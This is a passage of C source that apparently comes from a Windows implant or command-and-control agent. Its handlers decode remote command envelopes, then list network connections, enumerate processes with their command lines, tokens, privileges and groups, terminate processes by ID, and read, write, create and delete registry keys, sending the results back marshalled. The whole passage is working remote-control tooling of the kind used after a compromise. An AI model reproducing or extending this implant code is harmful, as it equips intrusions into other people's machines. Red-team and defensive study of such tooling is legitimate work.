			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
			SockTabEntry[0] = CreateStructElement(SockAddress, _countof(SockAddress), 1);
			FREE(lpTemp);
			FREE(lpIpAddress);

			cchIpAddress = INET_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv4AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);
		}
		else {
			cchIpAddress = INET6_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv6AddressToStringExW(&pConnection->LocalEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->LocalEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);

			cchIpAddress = INET6_ADDRSTRLEN + 1;
			lpIpAddress = ALLOC(cchIpAddress * sizeof(WCHAR));
			RtlIpv6AddressToStringExW(&pConnection->RemoteEndpoint.Address.InAddr, 0, 0, lpIpAddress, &cchIpAddress);
			lpTemp = ConvertWcharToChar(lpIpAddress);
			SockAddress[0] = CreateBytesElement(lpTemp, lstrlenA(lpTemp), 1);
			SockAddress[1] = CreateVarIntElement(pConnection->RemoteEndpoint.Port, 2);
			SockTabEntry[1] = CreateStructElement(SockAddress, _countof(SockAddress), 2);
			FREE(lpTemp);
			FREE(lpIpAddress);
		}

		SockTabList[i] = CreateStructElement(SockTabEntry, _countof(SockTabEntry), 0);
	}

	pFinalElement = CreateRepeatedStructElement(SockTabList, dwNumberOfConnections, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	FREE(pNetState);
	FREE(pTemp);
	FREE(SockTabList);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE PsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PBYTE pProcesses = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcessInfo = NULL;
	PPROCESS_BASIC_INFORMATION pBasicInfo = NULL;
	PPBElement PrivilegeElements[2];
	PPBElement pTokenGroupElements[5];
	PPBElement pTokenElements[8];
	PPBElement pProcessElements[13];
	PPBElement* pElementList = NULL;
	PPBElement* pElementList2 = NULL;
	PPBElement pFinalElement = NULL;
	DWORD cElementList2 = 0x400;
	PIMAGE_VERION pImageVersion = NULL;
	LPSTR lpImagePath = NULL;
	LPSTR lpImageName = NULL;
	DWORD dwGroupsCount = 0;
	DWORD cbProcesses = 0;
	HANDLE hToken = NULL;
	DWORD i = 0;
	DWORD dwIdx = 0;
	LPSTR lpTempStr = NULL;
	HANDLE hProc = NULL;
	DWORD dwArch = 0;
	LPSTR ElevationDescs[] = { NULL, "No (Default)", "No (Full)", "No (Limited)", "Yes", "Yes (Default)", "Yes (Full)", "Yes (Limited))" };
	PTOKEN_INFO pTokenInfo = NULL;
	PTOKEN_GROUP_INFO pGroupInfo = NULL;
	DWORD dwPrivilegeAttr = 0;
	PENVELOPE pResult = NULL;
	DWORD dwTemp = 0;
	PPBElement pReceivedElement = NULL;
	PUINT64 pUnmarshalledPid = NULL;

	pReceivedElement = ALLOC(sizeof(PBElement));
	pReceivedElement->Type = Varint;
	pReceivedElement->dwFieldIdx = 1;
	pUnmarshalledPid = UnmarshalStruct(&pReceivedElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	pProcesses = EnumProcess(&cbProcesses);
	if (pProcesses == NULL || cbProcesses == 0) {
		goto CLEANUP;
	}

	pElementList2 = ALLOC(sizeof(PPBElement) * cElementList2);
	pProcessInfo = pProcesses;
	while (TRUE) {
		if (pProcessInfo->UniqueProcessId == SYSTEM_IDLE_PROCESS_ID || pProcessInfo->UniqueProcessId == SYSTEM_PROCESS_ID) {
			goto CONTINUE;
		}

		if (pUnmarshalledPid != NULL && pProcessInfo->UniqueProcessId != *pUnmarshalledPid) {
			goto CONTINUE;
		}

		hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pProcessInfo->UniqueProcessId);
		if (hProc == NULL) {
			goto CONTINUE;
		}

		if (dwIdx >= cElementList2) {
			cElementList2 = dwIdx * 2;
			pElementList2 = REALLOC(pElementList2, sizeof(PPBElement) * cElementList2);
		}

		SecureZeroMemory(pProcessElements, sizeof(pProcessElements));
		pBasicInfo = GetProcessBasicInfo(hProc);
		lpTempStr = GetProcessImageFileNameWin32(hProc);
		lpImagePath = DuplicateStrA(lpTempStr, 0);
		pProcessElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
		FREE(lpTempStr);

		lpImageName = PathFindFileNameA(lpImagePath);
		pProcessElements[12] = CreateBytesElement(lpImageName, lstrlenA(lpImageName), 13);

		lpTempStr = GetProcessCommandLine(hProc);
		if (lpTempStr != NULL) {
			pProcessElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
			FREE(lpTempStr);
		}

		lpTempStr = GetProcessCurrentDirectory(hProc);
		if (lpTempStr != NULL) {
			pProcessElements[2] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 3);
			FREE(lpTempStr);
		}

		pProcessElements[3] = CreateVarIntElement((UINT64)pProcessInfo->UniqueProcessId, 4);
		pProcessElements[4] = CreateVarIntElement((UINT64)pBasicInfo->InheritedFromUniqueProcessId, 5);

		lpTempStr = DescribeProcessMitigation(hProc);
		if (lpTempStr != NULL) {
			pProcessElements[5] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 6);
			FREE(lpTempStr);
		}

		pImageVersion = GetImageVersion(lpImagePath);
		if (pImageVersion != NULL) {
			if (pImageVersion->lpVersion != NULL) {
				pProcessElements[6] = CreateBytesElement(pImageVersion->lpVersion, lstrlenA(pImageVersion->lpVersion), 7);
			}

			if (pImageVersion->lpCompanyName != NULL) {
				pProcessElements[7] = CreateBytesElement(pImageVersion->lpCompanyName, lstrlenA(pImageVersion->lpCompanyName), 8);
			}

			if (pImageVersion->lpImageDesc != NULL) {
				pProcessElements[8] = CreateBytesElement(pImageVersion->lpImageDesc, lstrlenA(pImageVersion->lpImageDesc), 9);
			}

			if (pImageVersion->lpProductName != NULL) {
				pProcessElements[9] = CreateBytesElement(pImageVersion->lpProductName, lstrlenA(pImageVersion->lpProductName), 10);
			}
		}

		dwArch = GetImageArchitecture(lpImagePath);
		if (dwArch == IMAGE_FILE_MACHINE_I386) {
			pProcessElements[10] = CreateVarIntElement(TRUE, 11);
		}
		else if (dwArch == IMAGE_FILE_MACHINE_AMD64) {
			pProcessElements[10] = CreateVarIntElement(FALSE, 11);
		}

		hToken = NULL;
		if (OpenProcessToken(hProc, TOKEN_READ, &hToken)) {
			pTokenInfo = GetTokenInfo(hProc);
			if (pTokenInfo != NULL) {
				SecureZeroMemory(pTokenElements, sizeof(pTokenElements));
				pTokenElements[2] = CreateVarIntElement(pTokenInfo->dwSession, 3);
				pTokenElements[3] = CreateBytesElement(pTokenInfo->lpUserName, lstrlenA(pTokenInfo->lpUserName), 4);
				if (pUnmarshalledPid != NULL) {
					pTokenElements[0] = CreateVarIntElement(pTokenInfo->IsElevated, 1);
					if (pTokenInfo->IsElevated) {
						lpTempStr = DuplicateStrA(ElevationDescs[pTokenInfo->ElevationType + 4], 0);
					}
					else {
						lpTempStr = DuplicateStrA(ElevationDescs[pTokenInfo->ElevationType], 0);
					}

					pTokenElements[1] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 2);
					FREE(lpTempStr);

					pTokenElements[4] = CreateBytesElement(pTokenInfo->lpUserSID, lstrlenA(pTokenInfo->lpUserSID), 5);
					pTokenElements[5] = CreateBytesElement(pTokenInfo->lpIntegrityLevel, lstrlenA(pTokenInfo->lpIntegrityLevel), 6);
					pElementList = ALLOC(pTokenInfo->pPrivileges->PrivilegeCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->pPrivileges->PrivilegeCount; i++) {
						SecureZeroMemory(PrivilegeElements, sizeof(PrivilegeElements));
						dwTemp = 0x40;
						lpTempStr = ALLOC(dwTemp);
						LookupPrivilegeNameA(NULL, &pTokenInfo->pPrivileges->Privileges[i].Luid, lpTempStr, &dwTemp);
						PrivilegeElements[0] = CreateBytesElement(lpTempStr, lstrlenA(lpTempStr), 1);
						FREE(lpTempStr);

						dwPrivilegeAttr = pTokenInfo->pPrivileges->Privileges[i].Attributes;
						if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED) {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Enabled", lstrlenA("Enabled"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Enabled (modified)", lstrlenA("Enabled (modified)"), 2);
							}
						}
						else {
							if (dwPrivilegeAttr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
								PrivilegeElements[1] = CreateBytesElement("Disabled (modified)", lstrlenA("Disabled (modified)"), 2);
							}
							else {
								PrivilegeElements[1] = CreateBytesElement("Disabled", lstrlenA("Disabled"), 2);
							}
						}

						pElementList[i] = CreateStructElement(PrivilegeElements, _countof(PrivilegeElements), 0);
					}

					pTokenElements[6] = CreateRepeatedStructElement(pElementList, pTokenInfo->pPrivileges->PrivilegeCount, 7);
					FREE(pElementList);
					pElementList = ALLOC(pTokenInfo->dwGroupCount * sizeof(PPBElement));
					for (i = 0; i < pTokenInfo->dwGroupCount; i++) {
						SecureZeroMemory(pTokenGroupElements, sizeof(pTokenGroupElements));
						pGroupInfo = &pTokenInfo->pTokenGroupsInfo[i];
						if (pGroupInfo->lpName != NULL) {
							pTokenGroupElements[0] = CreateBytesElement(pGroupInfo->lpName, lstrlenA(pGroupInfo->lpName), 1);
						}

						if (pGroupInfo->lpStatus != NULL) {
							pTokenGroupElements[1] = CreateBytesElement(pGroupInfo->lpStatus, lstrlenA(pGroupInfo->lpStatus), 2);
						}

						if (pGroupInfo->lpSID != NULL) {
							pTokenGroupElements[2] = CreateBytesElement(pGroupInfo->lpSID, lstrlenA(pGroupInfo->lpSID), 3);
						}

						if (pGroupInfo->lpDesc != NULL) {
							pTokenGroupElements[3] = CreateBytesElement(pGroupInfo->lpDesc, lstrlenA(pGroupInfo->lpDesc), 4);
						}

						if (pGroupInfo->lpMandatoryLabel != NULL) {
							pTokenGroupElements[4] = CreateBytesElement(pGroupInfo->lpMandatoryLabel, lstrlenA(pGroupInfo->lpMandatoryLabel), 5);
						}

						pElementList[i] = CreateStructElement(pTokenGroupElements, _countof(pTokenGroupElements), 0);
					}

					pTokenElements[7] = CreateRepeatedStructElement(pElementList, pTokenInfo->dwGroupCount, 8);
					FREE(pElementList);
				}

				pProcessElements[11] = CreateStructElement(pTokenElements, _countof(pTokenElements), 12);
			}
		}

		pElementList2[dwIdx++] = CreateStructElement(pProcessElements, _countof(pProcessElements), 0);
		CloseHandle(hProc);
		FREE(lpImagePath);
		FreeImageVersion(pImageVersion);
		FreeTokenInfo(pTokenInfo);
		FREE(pBasicInfo);
	CONTINUE:
		if (pProcessInfo->NextEntryOffset) {
			pProcessInfo = (PSYSTEM_PROCESS_INFORMATION)PTR_ADD_OFFSET((pProcessInfo), ((PSYSTEM_PROCESS_INFORMATION)(pProcessInfo))->NextEntryOffset);
		}
		else {
			break;
		}
	}

	pFinalElement = CreateRepeatedStructElement(pElementList2, dwIdx, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FREE(pUnmarshalledPid);
	FREE(pReceivedElement);
	FREE(pElementList2);
	FREE(pProcesses);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE TerminateHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[2];
	DWORD i = 0;
	PUINT64 UnmarshaledData = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwPid = 0;
	BOOL Force = FALSE;
	HANDLE hProcess = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Varint;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	dwPid = UnmarshaledData[0];
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	if (hProcess == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		goto CLEANUP;
	}

	if (!TerminateProcess(hProcess, 0)) {
		LOG_ERROR("TerminateProcess", GetLastError());
		goto CLEANUP;
	}

	pFinalElement = CreateVarIntElement(dwPid, 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	FREE(UnmarshaledData);
	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hProcess != NULL) {
		CloseHandle(hProcess);
	}

	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistryReadHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	DWORD dwValueType = 0;
	DWORD cbData = 0;
	PBYTE pData = NULL;
	LPSTR lpFormattedValue = NULL;
	LPSTR lpTemp = NULL;
	DWORD cbFormattedValue = 0x400;
	DWORD dwPos = 0;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshaledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshaledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_READ, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_READ, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
	}

	lpTemp = NULL;
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, NULL, &cbData);
	if (Status != ERROR_SUCCESS) {
		if (Status == ERROR_FILE_NOT_FOUND) {
			if (lpValueName == NULL) {
				pData = DuplicateStrA("(value not set)", 0);
			}
			else {
				pData = DuplicateStrA("Registry path not found", 0);
			}

			dwValueType = REG_SZ;
		}
		else {
			LOG_ERROR("RegGetValueA", Status);
			goto CLEANUP;
		}
	}
	else {
		cbData += 2;
		pData = ALLOC(cbData);
		Status = RegGetValueA(hKey, NULL, lpValueName, RRF_RT_ANY, &dwValueType, pData, &cbData);
		if (Status != ERROR_SUCCESS) {
			LOG_ERROR("RegGetValueA", Status);
			goto CLEANUP;
		}
	}

	if (dwValueType == REG_BINARY) {
		lpFormattedValue = ALLOC(cbFormattedValue);
		dwPos = 1;
		lpFormattedValue[0] = '[';
		for (i = 0; i < cbData; i++) {
			if (dwPos + 10 >= cbFormattedValue) {
				cbFormattedValue = dwPos * 2;
				lpFormattedValue = REALLOC(lpFormattedValue, cbFormattedValue);
			}

			dwPos += wsprintfA(&lpFormattedValue[dwPos], "%d ", pData[i]);
		}

		lpFormattedValue[dwPos - 1] = ']';
	}
	else if (dwValueType == REG_SZ || dwValueType == REG_EXPAND_SZ) {
		lpFormattedValue = DuplicateStrA(pData, 0);
	}
	else if (dwValueType == REG_DWORD || dwValueType == REG_QWORD) {
		lpFormattedValue = ALLOC(0x20);
		if (dwValueType == REG_DWORD) {
			wsprintfA(lpFormattedValue, "0x%08x", *((PDWORD)(pData)));
		}
		else {
			wsprintfA(lpFormattedValue, "0x%08IX", *((PQWORD)(pData)));
		}
	}
	else if (dwValueType == REG_MULTI_SZ) {
		lpFormattedValue = ALLOC(cbData + 1);
		memcpy(lpFormattedValue, pData, cbData);
		lpTemp = lpFormattedValue;
		while (TRUE) {
			if (lpTemp >= lpFormattedValue + cbData || lpTemp[0] == '\0') {
				break;
			}

			lpTemp += lstrlenA(lpTemp);
			lpTemp[0] = '\n';
			lpTemp++;
		}
	}
	else {
		LogError(L"Invalid value type\n");
		goto CLEANUP;
	}

	pFinalElement = CreateBytesElement(lpFormattedValue, lstrlenA(lpFormattedValue), 1);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshaledData[i]);
		}

		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FREE(RecvElementList[i]);
	}

	FREE(pData);
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpFormattedValue);
	FREE(lpPath);
	FREE(lpHive);
	FREE(lpValueName);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistryWriteHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[10];
	DWORD i = 0;
	LPVOID* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;
	DWORD dwValueType = 0;
	PBYTE pValue = NULL;
	DWORD cbValue = 0;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	RecvElementList[6]->Type = Varint;
	RecvElementList[7]->Type = Varint;
	RecvElementList[9]->Type = Varint;
	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	dwValueType = (DWORD)UnmarshaledData[9];
	if (dwValueType == 1) {
		if (UnmarshaledData[5] == NULL) {
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshaledData[5])->cbBuffer;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshaledData[5])->pBuffer, cbValue);
		dwValueType = REG_BINARY;
	}
	else if (dwValueType == 3) {
		cbValue = sizeof(DWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshaledData[6], cbValue);
		dwValueType = REG_DWORD;
	}
	else if (dwValueType == 4) {
		cbValue = sizeof(QWORD);
		pValue = ALLOC(cbValue);
		memcpy(pValue, &UnmarshaledData[7], cbValue);
		dwValueType = REG_QWORD;
	}
	else if (dwValueType == 2) {
		if (UnmarshaledData[4] == NULL) {
			goto CLEANUP;
		}

		cbValue = ((PBUFFER)UnmarshaledData[4])->cbBuffer + 1;
		pValue = ALLOC(cbValue);
		memcpy(pValue, ((PBUFFER)UnmarshaledData[4])->pBuffer, cbValue);
		dwValueType = REG_SZ;
	}

	lpHive = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
	lpPath = DuplicateStrA(((PBUFFER)UnmarshaledData[1])->pBuffer, 0);
	lpValueName = DuplicateStrA(((PBUFFER)UnmarshaledData[2])->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpValueName);
	Status = RegOpenKeyExA(hRootKey, lpTemp, 0, KEY_WRITE, &hKey);
	if (Status == ERROR_FILE_NOT_FOUND) {
		FREE(lpTemp);
		Status = RegOpenKeyExA(hRootKey, lpPath, 0, KEY_WRITE, &hKey);
	}
	else if (Status == ERROR_SUCCESS) {
		FREE(lpPath);
		lpPath = lpTemp;
		FREE(lpValueName);
		lpValueName = NULL;
		if (dwValueType != REG_SZ) {
			LogError(L"Cannot assign this registry type to default key value\n");
			goto CLEANUP;
		}
	}

	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegSetValueExA(hKey, lpValueName, 0, dwValueType, pValue, cbValue);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueExA", Status);
		goto CLEANUP;
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			if (RecvElementList[i]->Type != Varint) {
				FreeBuffer(UnmarshaledData[i]);
			}

			FREE(RecvElementList[i]);
		}

		FREE(UnmarshaledData);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpPath);
	FREE(lpHive);
	FREE(lpValueName);
	FREE(pValue);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistryCreateKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshaledData[1]->pBuffer, 0);
	lpKeyName = DuplicateStrA(UnmarshaledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
	else if (!lstrcmpA(lpHive, "HKPD")) {
		hRootKey = HKEY_PERFORMANCE_DATA;
	}
	else if (!lstrcmpA(lpHive, "HKU")) {
		hRootKey = HKEY_USERS;
	}
	else if (!lstrcmpA(lpHive, "HKCC")) {
		hRootKey = HKEY_CURRENT_CONFIG;
	}
	else {
		goto CLEANUP;
	}

	lpTemp = DuplicateStrA(lpPath, 0);
	lpTemp = StrCatExA(lpTemp, "\\");
	lpTemp = StrCatExA(lpTemp, lpKeyName);
	Status = RegCreateKeyA(hRootKey, lpTemp, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyA", Status);
		goto CLEANUP;
	}

	pFinalElement = CreateStructElement(NULL, 0, 9);
	pResult = ALLOC(sizeof(ENVELOPE));
	pResult->uID = pEnvelope->uID;
	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
	pFinalElement->pMarshaledData = NULL;
CLEANUP:
	if (UnmarshaledData != NULL) {
		for (i = 0; i < _countof(RecvElementList); i++) {
			FreeBuffer(UnmarshaledData[i]);
		}

		FREE(UnmarshaledData);
	}

	for (i = 0; i < _countof(RecvElementList); i++) {
		FreeElement(RecvElementList[i]);
	}

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	FREE(lpPath);
	FREE(lpHive);
	FREE(lpKeyName);
	FREE(lpTemp);
	FreeElement(pFinalElement);

	return pResult;
}

PENVELOPE RegistryDeleteKeyHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PENVELOPE pResult = NULL;
	PPBElement RecvElementList[3];
	DWORD i = 0;
	PBUFFER* UnmarshaledData = NULL;
	LPSTR lpHive = NULL;
	LPSTR lpPath = NULL;
	LPSTR lpValueName = NULL;
	LPSTR lpKeyName = NULL;
	HKEY hRootKey = NULL;
	HKEY hKey = NULL;
	LSTATUS Status = ERROR_SUCCESS;
	LPSTR lpTemp = NULL;
	PPBElement pFinalElement = NULL;

	for (i = 0; i < _countof(RecvElementList); i++) {
		RecvElementList[i] = ALLOC(sizeof(PBElement));
		RecvElementList[i]->dwFieldIdx = i + 1;
		RecvElementList[i]->Type = Bytes;
	}

	UnmarshaledData = UnmarshalStruct(RecvElementList, _countof(RecvElementList), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL) {
		goto CLEANUP;
	}

	if (UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL || UnmarshaledData[2] == NULL) {
		goto CLEANUP;
	}

	lpHive = DuplicateStrA(UnmarshaledData[0]->pBuffer, 0);
	lpPath = DuplicateStrA(UnmarshaledData[1]->pBuffer, 0);
	lpValueName = DuplicateStrA(UnmarshaledData[2]->pBuffer, 0);
	if (!lstrcmpA(lpHive, "HKCR")) {
		hRootKey = HKEY_CLASSES_ROOT;
	}
	else if (!lstrcmpA(lpHive, "HKCU")) {
		hRootKey = HKEY_CURRENT_USER;
	}
	else if (!lstrcmpA(lpHive, "HKLM")) {
		hRootKey = HKEY_LOCAL_MACHINE;
	}
